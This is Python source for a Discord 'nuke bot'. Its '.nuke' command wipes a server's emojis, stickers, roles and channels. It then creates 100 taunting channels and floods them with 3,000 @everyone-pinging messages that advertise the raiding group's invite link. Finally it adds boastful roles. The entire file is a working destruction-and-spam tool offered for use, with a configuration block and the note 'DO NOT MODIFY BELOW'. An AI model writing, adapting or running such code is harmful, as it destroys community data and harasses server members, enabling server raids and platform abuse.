import asyncio
import discord
from discord.ext import commands
import random
import time
import os

# --- CONFIGURE THESE ---
BOT_TOKEN = os.getenv("TOKEN", "PUT YOUR BOT TOKEN HERE!")
PREFIX = "."

# Channel names (fancy variants)
RANDOM_CHANNEL_NAMES = [
    "𝔫𝔦𝔤𝔥𝔱𝔪𝔞𝔯𝔢 𝔦𝔰 𝔥𝔢𝔯𝔢",
    "ɴɪɢʜᴛᴍᴀʀᴇ ɪs ʜᴇʀᴇ",
    "ⁿⁱᵍʰᵐᵃʳᵉ ⁱˢ ʰᵉʳᵉ",
    "₦ł₲Ⱨ₮₥₳ⱤɆ ł₴ ⱧɆⱤɆ",
    "d̸e̸st̸r̸o̸y̸e̸d̸",
    "n҈i҈g҈h҈m҈a҈r҈e҈ i҈s҈ h҈e҈r҈e҈",
    "d҉e҉s҉t҉r҉o҉y҉e҉d҉d",
    "dєstrσчєd",
    "n̶i̶g̶h̶t̶m̶a̶r̶e̶"
]
USE_RANDOM_NAMES = True
CHANNEL_NAME = "nuked"  # fallback

# New message content with image
MESSAGE = """# NUKED BY NXL
N3XEL ON TOPPPPP
https://discord.gg/pbtxaTf8Q4
https://cdn.discordapp.com/attachments/1500712288032919572/1504852428745474069/image0.gif?ex=6a087e89&is=6a072d09&hm=f6a03505868048307d883a58fe9ec7b796f77d5ee22e4230017e16b1c74a3497&
||@everyone|| ||@here||"""

AMOUNT_OF_CHANNELS = 100
MESSAGES_PER_CHANNEL = 30
AMOUNT_OF_MESSAGES = AMOUNT_OF_CHANNELS * MESSAGES_PER_CHANNEL

# Roles to create after nuke
NEW_ROLES = [
    "tamed by N3XL",
    "n̾x̾l̾ o̾n̾ t̾o̾p̾",
    "N̶X̶L̶ O̶N̶ T̶O̶P̶",
    "₦ɆӾɆⱠ"
]

# -----------------------
# DO NOT MODIFY BELOW
# -----------------------

def get_channel_name():
    if USE_RANDOM_NAMES and RANDOM_CHANNEL_NAMES:
        return random.choice(RANDOM_CHANNEL_NAMES)
    return CHANNEL_NAME

intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.message_content = True
intents.emojis_and_stickers = True  # needed to access emojis/stickers

bot = commands.Bot(command_prefix=PREFIX, intents=intents)

# Helper: run async tasks concurrently
async def run_concurrent(tasks, limit=50):
    sem = asyncio.Semaphore(limit)
    async def bounded(task):
        async with sem:
            return await task
    return await asyncio.gather(*(bounded(t) for t in tasks), return_exceptions=True)

async def delete_emojis(guild):
    emojis = list(guild.emojis)
    if not emojis:
        return
    print(f"Deleting {len(emojis)} emojis...")
    tasks = [emoji.delete() for emoji in emojis]
    await run_concurrent(tasks, 20)
    print("Emojis deleted.")

async def delete_stickers(guild):
    stickers = list(guild.stickers)
    if not stickers:
        return
    print(f"Deleting {len(stickers)} stickers...")
    tasks = [sticker.delete() for sticker in stickers]
    await run_concurrent(tasks, 20)
    print("Stickers deleted.")

async def delete_roles(guild):
    # Get all roles except @everyone (position 0)
    roles = [r for r in guild.roles if r.name != "@everyone"]
    # Also skip the bot's own highest role if needed (Discord won't let you delete roles higher than bot's)
    bot_member = guild.me
    bot_top_role = bot_member.top_role
    deletable = []
    for r in roles:
        # Can't delete roles higher than bot's top role
        if r >= bot_top_role:
            print(f"Skipping role {r.name} (higher than bot)")
            continue
        deletable.append(r)
    if not deletable:
        return
    print(f"Deleting {len(deletable)} roles...")
    tasks = [role.delete() for role in deletable]
    await run_concurrent(tasks, 20)
    print("Roles deleted.")

async def create_roles(guild):
    print(f"Creating {len(NEW_ROLES)} roles...")
    tasks = []
    for role_name in NEW_ROLES:
        tasks.append(guild.create_role(name=role_name, reason="Nuked by N3XEL"))
    results = await asyncio.gather(*tasks, return_exceptions=True)
    created = [r for r in results if isinstance(r, discord.Role)]
    print(f"Created {len(created)} roles.")
    return created

async def send_messages_fast(channels, message, total):
    if not channels:
        return
    semaphore = asyncio.Semaphore(50)
    async def send_one(channel):
        async with semaphore:
            try:
                await channel.send(message)
            except Exception:
                pass
    tasks = []
    for i in range(total):
        channel = channels[i % len(channels)]
        tasks.append(send_one(channel))
    await asyncio.gather(*tasks, return_exceptions=True)

async def nuke_server(guild: discord.Guild):
    print(f"Starting nuke on {guild.name} ({guild.id})")
    start_time = time.perf_counter()

    # Step 1: Delete emojis, stickers, roles
    await delete_emojis(guild)
    await delete_stickers(guild)
    await delete_roles(guild)

    # Step 2: Delete all channels
    print("Deleting all channels...")
    await asyncio.gather(
        *(channel.delete() for channel in guild.channels),
        return_exceptions=True
    )

    # Step 3: Create new channels
    print(f"Creating {AMOUNT_OF_CHANNELS} channels...")
    async def create_one():
        return await guild.create_text_channel(get_channel_name())
    channels = await asyncio.gather(
        *(create_one() for _ in range(AMOUNT_OF_CHANNELS)),
        return_exceptions=True
    )
    text_channels = [c for c in channels if isinstance(c, discord.TextChannel)]
    print(f"Created {len(text_channels)} channels.")

    # Step 4: Send messages
    if text_channels:
        print(f"Sending {AMOUNT_OF_MESSAGES} total messages ({MESSAGES_PER_CHANNEL} per channel)...")
        await send_messages_fast(text_channels, MESSAGE, AMOUNT_OF_MESSAGES)

    # Step 5: Create new roles
    await create_roles(guild)

    elapsed = time.perf_counter() - start_time
    print(f"Nuke completed in {elapsed:.2f} seconds!")

@bot.event
async def on_ready():
    print(f"Bot is online as {bot.user}")
    print(f"Prefix: {PREFIX}")
    print(f"Command: {PREFIX}nuke")
    print("=" * 50)

@bot.command(name="nuke")
async def nuke(ctx):
    if not ctx.author.guild_permissions.administrator:
        await ctx.send("❌ You need Administrator permission to use this command!")
        return
    await ctx.send("💣 Nuking server in progress...")
    await nuke_server(ctx.guild)

@bot.command(name="config")
async def config(ctx):
    config_msg = f"""
**Current Configuration:**
📝 Channel Names: `{len(RANDOM_CHANNEL_NAMES)} variants`
🎲 Random Names: `{'Enabled' if USE_RANDOM_NAMES else 'Disabled'}`
💬 Message Preview: `{MESSAGE[:60]}...`
📊 Channels: `{AMOUNT_OF_CHANNELS}`
📨 Messages per Channel: `{MESSAGES_PER_CHANNEL}`
📨 Total Messages: `{AMOUNT_OF_MESSAGES}`
👑 New Roles: `{', '.join(NEW_ROLES)}`
    """
    await ctx.send(config_msg)

if __name__ == "__main__":
    if BOT_TOKEN == "PUT YOUR BOT TOKEN HERE!" and not os.getenv("TOKEN"):
        print("❌ Please set your TOKEN environment variable.")
        exit(1)
    print("Starting Nuke Bot...")
    print("=" * 50)
    bot.run(BOT_TOKEN)
